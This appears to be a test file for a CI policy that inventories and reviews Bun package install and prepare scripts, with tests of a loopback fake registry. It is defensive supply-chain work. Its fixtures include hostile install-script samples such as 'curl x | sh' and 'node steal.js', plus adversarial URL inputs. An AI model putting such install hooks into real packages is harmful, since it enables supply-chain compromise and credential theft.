// T03: Bun lifecycle-script policy. Reads manifests only; never runs a script.
import { createHash } from "node:crypto";
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { createRequire } from "node:module";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { afterAll, describe, expect, it } from "vitest";

import {
  inventoryScripts as readInventoryScripts,
  lifecycleProblems,
  prepareDigest,
} from "../../scripts/ci/lifecycle-policy.mjs";
import { parseRestrictedYaml } from "../../scripts/ci/lockfile-graph.mjs";
import { createRegistryHandler } from "../fixtures/bun-lifecycle/marker-probe.mjs";

type Scope = "app" | "release";
const sha256 = (text: string) =>
  createHash("sha256").update(text).digest("hex");
const base = mkdtempSync(join(tmpdir(), "t03-lifecycle-"));
afterAll(() => rmSync(base, { recursive: true, force: true }));

type Spec = {
  entry: string;
  name: string;
  version: string;
  scripts?: Record<string, string>;
  bindingGyp?: boolean;
  dependencies?: Record<string, string>;
};
const expectedGraphs = new Map<string, unknown>();
const inventoryScripts = (dir: string, scope: Scope) =>
  readInventoryScripts(dir, scope, {
    expectedGraph: expectedGraphs.get(dir),
    platform: { os: "darwin", cpu: "arm64" },
  });
/** A synthetic isolated store: node_modules/.bun/<entry>/node_modules/<name>. */
function project(specs: Spec[]) {
  const dir = mkdtempSync(join(base, "p-"));
  for (const spec of specs) {
    const modules = join(
      dir,
      "node_modules",
      ".bun",
      spec.entry,
      "node_modules",
    );
    mkdirSync(join(modules, spec.name), { recursive: true });
    writeFileSync(
      join(modules, spec.name, "package.json"),
      JSON.stringify({
        name: spec.name,
        version: spec.version,
        scripts: spec.scripts,
        dependencies: spec.dependencies,
      }),
    );
    if (spec.bindingGyp)
      writeFileSync(join(modules, spec.name, "binding.gyp"), "{}");
  }
  const nodes = new Map(
    specs.map((spec) => [
      spec.entry,
      {
        id: spec.entry,
        key: `${spec.name}@${spec.version}`,
        name: spec.name,
        version: spec.version,
        integrity: `sha512-${createHash("sha512").update(spec.name).digest("base64")}`,
        os: [],
        cpu: [],
        libc: [],
      },
    ]),
  );
  const roots = specs.map((spec, index) => ({
    alias: `fixture-${index}`,
    kind: "dependencies",
    target: spec.entry,
  }));
  for (const [index, spec] of specs.entries())
    symlinkSync(
      join(".bun", spec.entry, "node_modules", spec.name),
      join(dir, "node_modules", `fixture-${index}`),
    );
  const edges = new Map(
    specs.map((spec) => [
      spec.entry,
      Object.keys(spec.dependencies ?? {}).map((alias) => {
        const target = specs.find((candidate) => candidate.name === alias);
        if (!target) throw new Error(`Missing fixture dependency ${alias}`);
        return { alias, kind: "dependencies", target: target.entry };
      }),
    ]),
  );
  expectedGraphs.set(dir, { nodes, edges, roots, problems: [] });
  return dir;
}
const pathOf = (entry: string, name: string) =>
  `node_modules/.bun/${entry}/node_modules/${name}/package.json`;

const ESBUILD: Spec = {
  entry: "esbuild@0.27.0",
  name: "esbuild",
  version: "0.27.0",
  scripts: { postinstall: "node install.js" },
};
const ACORN: Spec = {
  entry: "acorn@8.18.0",
  name: "acorn",
  version: "8.18.0",
  scripts: { prepare: "cd ..; npm run build:main" },
};

function reviewFor(
  scope: Scope,
  dir: string,
  entries: Record<string, unknown>[],
) {
  const inventory = inventoryScripts(dir, scope);
  return { [scope]: entries, prepare: { [scope]: prepareDigest(inventory) } };
}
const blocked = (spec: Spec, extra: Record<string, unknown> = {}) => {
  const [script] = Object.entries(spec.scripts ?? {});
  if (!script) throw new Error(`${spec.name} review fixture needs a script`);
  const [event, body] = script;
  return {
    name: spec.name,
    version: spec.version,
    event,
    sha256: sha256(body),
    body,
    paths: [pathOf(spec.entry, spec.name)],
    decision: "blocked",
    ...extra,
  };
};
const check = (
  scope: Scope,
  dir: string,
  review: unknown,
  trustedDependencies: unknown = [],
) =>
  lifecycleProblems({
    inventory: inventoryScripts(dir, scope),
    review,
    scope,
    trustedDependencies,
  });

describe.each(["app", "release"] as const)(
  "lifecycle policy (%s scope)",
  (scope) => {
    const other: Scope = scope === "app" ? "release" : "app";

    it("inventories install-time and prepare scripts separately with path and body hash", () => {
      const dir = project([
        ESBUILD,
        ACORN,
        { entry: "ms@2.1.3", name: "ms", version: "2.1.3" },
      ]);
      const inventory = inventoryScripts(dir, scope);
      expect(inventory.manifests).toBe(3);
      expect(inventory.install).toEqual([
        {
          scope,
          name: "esbuild",
          version: "0.27.0",
          event: "postinstall",
          path: pathOf("esbuild@0.27.0", "esbuild"),
          body: "node install.js",
          sha256: sha256("node install.js"),
        },
      ]);
      expect(
        inventory.prepare.map(
          (row: { name: string; event: string }) => `${row.name}:${row.event}`,
        ),
      ).toEqual(["acorn:prepare"]);
    });

    it("keeps a reviewed blocked script blocked under explicit empty trust", () => {
      const dir = project([ESBUILD, ACORN]);
      const review = reviewFor(scope, dir, [blocked(ESBUILD)]);
      expect(check(scope, dir, review, [])).toEqual([]);
      expect(check(scope, dir, review, ["esbuild"])).toEqual(
        expect.arrayContaining([
          expect.stringContaining("reviewed as blocked but trusted"),
        ]),
      );
    });

    it("rejects omitted trustedDependencies (Bun's default trust list would apply)", () => {
      const dir = project([ESBUILD]);
      const review = reviewFor(scope, dir, [blocked(ESBUILD)]);
      const inventory = inventoryScripts(dir, scope);
      expect(
        lifecycleProblems({
          inventory,
          review,
          scope,
          trustedDependencies: undefined,
        }),
      ).toEqual([
        `${scope}: trustedDependencies must be declared explicitly (omitting it enables Bun's default trust list)`,
      ]);
    });

    it("rejects new, changed and implicit node-gyp install scripts", () => {
      const dir = project([ESBUILD]);
      const review = reviewFor(scope, dir, [blocked(ESBUILD)]);
      const added = project([
        ESBUILD,
        {
          entry: "evil@1.0.0",
          name: "evil",
          version: "1.0.0",
          scripts: { preinstall: "curl x | sh" },
        },
      ]);
      expect(
        check(scope, added, {
          ...review,
          prepare: reviewFor(scope, added, []).prepare,
        }),
      ).toEqual([
        `${scope}: evil@1.0.0 preinstall (${pathOf("evil@1.0.0", "evil")}): unreviewed install-time script`,
      ]);
      const changed = project([
        {
          ...ESBUILD,
          scripts: { postinstall: "node install.js && node steal.js" },
        },
      ]);
      expect(check(scope, changed, review)).toEqual([
        expect.stringContaining("script body changed since review"),
      ]);
      const gyp = project([
        ESBUILD,
        {
          entry: "native@1.0.0",
          name: "native",
          version: "1.0.0",
          bindingGyp: true,
        },
      ]);
      expect(check(scope, gyp, review)).toEqual([
        expect.stringContaining("native@1.0.0 install"),
      ]);
      const bumped = project([
        { ...ESBUILD, entry: "esbuild@0.27.1", version: "0.27.1" },
      ]);
      expect(check(scope, bumped, review)).toEqual(
        expect.arrayContaining([
          expect.stringContaining("esbuild@0.27.1 postinstall"),
          expect.stringContaining("stale review"),
        ]),
      );
    });

    it("limits reviewed trust to its scope, version and installed path", () => {
      const dir = project([ESBUILD]);
      const trusted = blocked(ESBUILD, { decision: "trusted" });
      expect(
        check(scope, dir, reviewFor(scope, dir, [trusted]), ["esbuild"]),
      ).toEqual([]);
      expect(check(scope, dir, reviewFor(scope, dir, [trusted]), [])).toEqual([
        expect.stringContaining(
          "reviewed as trusted but not in trustedDependencies",
        ),
      ]);
      // Same review recorded only for the other scope does not carry over.
      const otherReview = {
        ...reviewFor(other, project([ESBUILD]), [trusted]),
        [scope]: [blocked(ESBUILD)],
        prepare: { [scope]: prepareDigest(inventoryScripts(dir, scope)) },
      };
      expect(check(scope, dir, otherReview, ["esbuild"])).toEqual(
        expect.arrayContaining([
          expect.stringContaining("reviewed as blocked but trusted"),
          `${scope}: trustedDependencies entry esbuild has no reviewed trusted script in this scope`,
        ]),
      );
      // A second installed variant/path or version would run under name-based trust.
      const variants = project([
        ESBUILD,
        { ...ESBUILD, entry: "esbuild@0.27.0+peer" },
        { ...ESBUILD, entry: "esbuild@0.25.0", version: "0.25.0" },
      ]);
      expect(
        check(scope, variants, reviewFor(scope, variants, [trusted]), [
          "esbuild",
        ]),
      ).toEqual(
        expect.arrayContaining([
          expect.stringContaining(
            "trusted review does not cover this installed path",
          ),
          `${scope}: trust for esbuild would also run unreviewed esbuild@0.25.0`,
          expect.stringContaining("esbuild@0.25.0 postinstall"),
        ]),
      );
      expect(
        check(
          scope,
          dir,
          reviewFor(scope, dir, [blocked(ESBUILD, { decision: "maybe" })]),
        ),
      ).toEqual([
        expect.stringContaining("review decision must be blocked or trusted"),
      ]);
    });

    it("requires a reviewed prepare inventory and flags any change to it", () => {
      const dir = project([ESBUILD, ACORN]);
      const review = reviewFor(scope, dir, [blocked(ESBUILD)]);
      expect(check(scope, dir, { [scope]: review[scope] })).toEqual([
        `${scope}: no reviewed prepare-script inventory`,
      ]);
      const changed = project([
        ESBUILD,
        { ...ACORN, scripts: { prepare: "npm run build && node x.js" } },
      ]);
      expect(check(scope, changed, review)).toEqual([
        `${scope}: prepare-script inventory changed (1 reviewed, 1 installed)`,
      ]);
      expect(check(scope, dir, { prepare: review.prepare })).toEqual(
        expect.arrayContaining([
          `${scope}: no reviewed lifecycle baseline`,
          expect.stringContaining("unreviewed install-time script"),
        ]),
      );
    });

    it("requires review for an identical prepare body at a new path", () => {
      const dir = project([ACORN]);
      const review = reviewFor(scope, dir, []);
      const added = project([ACORN, { ...ACORN, entry: "acorn@8.18.0+peer" }]);
      expect(check(scope, added, review)).toEqual([
        expect.stringContaining("prepare-script inventory changed"),
      ]);
    });

    it("binds prepare identities to scope, path, body and observation multiplicity", () => {
      const original = inventoryScripts(project([ACORN]), scope);
      const row = original.prepare[0];
      if (!row) throw new Error("Missing prepare fixture");
      const digest = prepareDigest(original);
      for (const patch of [
        { scope: other },
        { path: pathOf("acorn@8.18.0+peer", "acorn") },
        { body: "different" },
      ])
        expect(
          prepareDigest({ ...original, prepare: [{ ...row, ...patch }] })
            .sha256,
        ).not.toBe(digest.sha256);
      expect(prepareDigest({ ...original, prepare: [row, row] }).count).toBe(2);
      expect(
        lifecycleProblems({
          inventory: { ...original, prepare: [{ ...row, scope: other }] },
          scope,
          trustedDependencies: [],
          review: reviewFor(scope, project([ACORN]), []),
        }),
      ).toEqual(["Invalid lifecycle row scope/path/body/hash"]);
    });

    it("binds blocked reviews to exact paths and body as well as hash", () => {
      const dir = project([ESBUILD]);
      const review = reviewFor(scope, dir, [blocked(ESBUILD)]);
      const added = project([
        ESBUILD,
        { ...ESBUILD, entry: "esbuild@0.27.0+peer" },
      ]);
      expect(check(scope, added, review)).toEqual(
        expect.arrayContaining([expect.stringContaining("installed path")]),
      );
      expect(
        check(
          scope,
          dir,
          reviewFor(scope, dir, [blocked(ESBUILD, { body: "different" })]),
        ),
      ).toEqual(expect.arrayContaining([expect.stringContaining("body")]));
    });

    it("refuses missing store entries and dangling or escaped package links", () => {
      const dir = project([ESBUILD]);
      mkdirSync(join(dir, "node_modules/.bun/missing@1.0.0"));
      expect(() => inventoryScripts(dir, scope)).toThrow(
        /missing|node_modules/,
      );
      const broken = project([ESBUILD]);
      symlinkSync(
        join(base, "absent"),
        join(broken, "node_modules/.bun/esbuild@0.27.0/node_modules/hidden"),
      );
      expect(() => inventoryScripts(broken, scope)).toThrow(/link|ENOENT/);
      const external = project([
        {
          entry: "external@1.0.0",
          name: "external",
          version: "1.0.0",
          scripts: { install: "inert" },
        },
      ]);
      const escaped = project([ESBUILD]);
      symlinkSync(
        join(
          external,
          "node_modules/.bun/external@1.0.0/node_modules/external",
        ),
        join(escaped, "node_modules/.bun/esbuild@0.27.0/node_modules/external"),
      );
      expect(() => inventoryScripts(escaped, scope)).toThrow(
        /outside|escape|contained/,
      );
    });

    it("inventories owned manifests once, validates linked siblings, and refuses missing or empty stores", () => {
      const dir = project([
        ESBUILD,
        {
          entry: "host@1.0.0",
          name: "host",
          version: "1.0.0",
          dependencies: { esbuild: "0.27.0" },
        },
      ]);
      symlinkSync(
        join("..", "..", "esbuild@0.27.0", "node_modules", "esbuild"),
        join(
          dir,
          "node_modules",
          ".bun",
          "host@1.0.0",
          "node_modules",
          "esbuild",
        ),
      );
      expect(inventoryScripts(dir, scope).install).toHaveLength(1);
      expect(() => inventoryScripts(join(base, "absent"), scope)).toThrow(
        /does not exist/,
      );
      const empty = mkdtempSync(join(base, "empty-"));
      mkdirSync(join(empty, "node_modules", ".bun"), { recursive: true });
      expect(() => inventoryScripts(empty, scope)).toThrow(
        /no package manifests/,
      );
    });

    it("refuses a nested unreviewed script that Node would bind instead of the reviewed sibling", () => {
      const dir = project([
        ESBUILD,
        {
          entry: "host@1.0.0",
          name: "host",
          version: "1.0.0",
          dependencies: { esbuild: "0.27.0" },
        },
      ]);
      const host = join(dir, "node_modules/.bun/host@1.0.0/node_modules/host");
      symlinkSync(
        join("..", "..", "esbuild@0.27.0", "node_modules", "esbuild"),
        join(host, "..", "esbuild"),
      );
      const review = reviewFor(scope, dir, [blocked(ESBUILD)]);
      expect(check(scope, dir, review, [])).toEqual([]);
      const nested = join(host, "node_modules", "esbuild");
      mkdirSync(nested, { recursive: true });
      writeFileSync(
        join(nested, "package.json"),
        JSON.stringify({
          name: "esbuild",
          version: "9.0.0",
          scripts: { postinstall: "INERT_UNREVIEWED_MARKER_NEVER_EXECUTE" },
        }),
      );
      // Resolution only: the nested copy is nearer than the reviewed sibling.
      expect(
        createRequire(join(host, "package.json")).resolve(
          "esbuild/package.json",
        ),
      ).toBe(realpathSync(join(nested, "package.json")));
      expect(() => inventoryScripts(dir, scope)).toThrow(
        /host\/node_modules: unsupported nested node_modules/,
      );
      expect(() => check(scope, dir, review, [])).toThrow(
        /unsupported nested node_modules/,
      );
    });
  },
);

describe("reviewed baseline derived from the clean darwin-arm64 probes", () => {
  const review = JSON.parse(
    readFileSync("tests/fixtures/bun-lifecycle/reviewed-scripts.json", "utf8"),
  );
  const ignored = parseRestrictedYaml(
    readFileSync("pnpm-workspace.yaml", "utf8"),
  ).ignoredBuiltDependencies;

  it("app blocks exactly pnpm's reviewed ignoredBuiltDependencies; release blocks esbuild", () => {
    expect(
      review.app.map((entry: { name: string }) => entry.name).sort(),
    ).toEqual([...ignored].sort());
    expect(
      review.release.map(
        (entry: { name: string; version: string }) =>
          `${entry.name}@${entry.version}`,
      ),
    ).toEqual(["esbuild@0.27.0"]);
    for (const entry of [...review.app, ...review.release]) {
      expect(entry.decision).toBe("blocked");
      expect(entry.sha256).toBe(sha256(entry.body));
      expect(entry.paths.length).toBeGreaterThan(0);
    }
    expect(review.prepare.app.count).toBeGreaterThan(0);
    expect(review.prepare.release.count).toBeGreaterThan(0);
  });
});

describe("inert marker probe observations (Bun 1.4.3, darwin-arm64 only)", () => {
  // Frozen output of tests/fixtures/bun-lifecycle/marker-probe.mjs: two
  // synthetic packages from a loopback registry; the only script writes a
  // marker. No real dependency script ran. Not Linux evidence.
  const probe = JSON.parse(
    readFileSync(
      "tests/fixtures/bun-lifecycle/marker-probe-darwin-arm64.stdout",
      "utf8",
    ),
  );
  const byId = Object.fromEntries(
    probe.results.map((row: { id: string }) => [row.id, row]),
  );
  const ran = (id: string) =>
    Object.entries(byId[id].markers)
      .filter(([, value]) => value !== null)
      .map(([name]) => name);

  it("completed every case without timeout or signal", () => {
    expect(probe.bun).toBe("1.4.3+c6da4a4d3");
    expect(probe.platform).toBe("darwin-arm64");
    for (const row of probe.results)
      expect(row.install).toMatchObject({
        exit: 0,
        signal: null,
        timedOut: false,
        spawnError: null,
      });
  });

  it("shows the default-trust hazard and that an explicit empty list blocks it", () => {
    expect(ran("omitted")).toEqual(["esbuild"]);
    expect(ran("explicit-empty")).toEqual([]);
    expect(ran("explicit-default-name")).toEqual(["esbuild"]);
    expect(ran("explicit-plain-name")).toEqual(["t03-untrusted-marker"]);
    expect(ran("explicit-default-name-ignore-scripts")).toEqual([]);
  });

  it("records that env=false and --no-env-file do NOT keep .env out of install scripts", () => {
    expect(byId["explicit-default-name"].runtimeDotenv.value).toBe("unset");
    expect(
      byId["explicit-default-name-dotenv-enabled"].runtimeDotenv.value,
    ).toBe("from-dotenv");
    for (const id of [
      "omitted",
      "explicit-default-name",
      "explicit-default-name-no-env-file-global-flag",
      "explicit-default-name-no-env-file-install-flag",
    ])
      expect(byId[id].markers.esbuild).toBe("postinstall:from-dotenv");
  });
});

describe("inert marker probe loopback registry routing", () => {
  // Exercises the probe's real request handler with synthetic in-memory
  // packages and stub request/response objects: no socket, no tarball, no
  // Bun, no install, and importing the probe must not run its CLI.
  const VERSION = "0.0.0-t03.1";
  const PORT = 4873;
  const NAMES = ["esbuild", "t03-untrusted-marker"] as const;
  const synthetic = (name: string) => ({
    bytes: Buffer.from(`synthetic-tarball:${name}`),
    integrity: `sha512-synthetic-${name}`,
    shasum: `synthetic-${name}`,
    manifest: { name, version: VERSION, scripts: { postinstall: "inert" } },
  });
  const packages = Object.fromEntries(
    NAMES.map((name) => [name, synthetic(name)]),
  );
  const handler = createRegistryHandler(packages, PORT);
  const request = (url: string) => {
    const writes: { status: number; type: string }[] = [];
    const bodies: unknown[] = [];
    handler(
      { method: "GET", url },
      {
        writeHead: (status: number, headers: Record<string, string>) =>
          writes.push({ status, type: headers["content-type"] ?? "" }),
        end: (body: unknown) => bodies.push(body),
      },
    );
    expect(writes).toHaveLength(1);
    expect(bodies).toHaveLength(1);
    return { ...writes[0]!, body: bodies[0] };
  };
  const tarballPath = (name: string) => `/${name}/-/${name}-${VERSION}.tgz`;

  it.each(NAMES)(
    "serves %s's manifest with its canonical loopback tarball URL",
    (name) => {
      const response = request(`/${name}`);
      expect(response).toMatchObject({ status: 200, type: "application/json" });
      expect(JSON.parse(String(response.body))).toEqual({
        name,
        "dist-tags": { latest: VERSION },
        versions: {
          [VERSION]: {
            name,
            version: VERSION,
            scripts: { postinstall: "inert" },
            dist: {
              tarball: `http://127.0.0.1:${PORT}${tarballPath(name)}`,
              integrity: `sha512-synthetic-${name}`,
              shasum: `synthetic-${name}`,
            },
          },
        },
      });
    },
  );

  it.each(NAMES)("serves %s's tarball only at the canonical path", (name) => {
    expect(request(tarballPath(name))).toEqual({
      status: 200,
      type: "application/octet-stream",
      body: packages[name]!.bytes,
    });
  });

  it.each([
    ["unknown manifest", "/left-pad"],
    ["unknown tarball", "/left-pad/-/left-pad-1.0.0.tgz"],
    ["wrong version", "/esbuild/-/esbuild-9.9.9.tgz"],
    ["wrong version prefix", `/esbuild/-/esbuild-${VERSION}0.tgz`],
    ["wrong file name", `/esbuild/-/t03-untrusted-marker-${VERSION}.tgz`],
    ["wrong directory name", `/t03-untrusted-marker/-/esbuild-${VERSION}.tgz`],
    ["prototype manifest", "/__proto__"],
    ["constructor manifest", "/constructor"],
    ["prototype tarball", `/__proto__/-/__proto__-${VERSION}.tgz`],
    ["toString tarball", `/toString/-/toString-${VERSION}.tgz`],
    ["malformed percent encoding", "/%E0%A4%A"],
    ["trailing lone percent", `${tarballPath("esbuild")}%`],
    ["percent-encoded name", "/%65sbuild"],
    ["percent-encoded slashes", `/esbuild%2F-%2Fesbuild-${VERSION}.tgz`],
    ["dot segment", `/esbuild/-/../-/esbuild-${VERSION}.tgz`],
    ["query string", "/esbuild?write=true"],
    ["trailing slash", "/esbuild/"],
    ["absolute-form target", `http://127.0.0.1:${PORT}/esbuild`],
    ["empty target", ""],
    ["root", "/"],
  ])("fails closed with 404 on %s", (_label, url) => {
    expect(request(url)).toEqual({
      status: 404,
      type: "application/json",
      body: JSON.stringify({ error: "not_found" }),
    });
  });

  it("answers CodeQL alert 15's adversarial target in linear time", () => {
    // The removed tarball pattern took >2 s on 50k repetitions of '.-0'.
    const url = `/./-/.-0${".-0".repeat(100_000)}!`;
    const started = performance.now();
    expect(request(url).status).toBe(404);
    expect(performance.now() - started).toBeLessThan(250);
  });

  it("refuses to build routes when a synthetic package is missing or inherited", () => {
    expect(() =>
      createRegistryHandler({ esbuild: synthetic("esbuild") }, PORT),
    ).toThrow("missing synthetic package: t03-untrusted-marker");
    expect(() => createRegistryHandler(Object.create(packages), PORT)).toThrow(
      "missing synthetic package: esbuild",
    );
  });
});
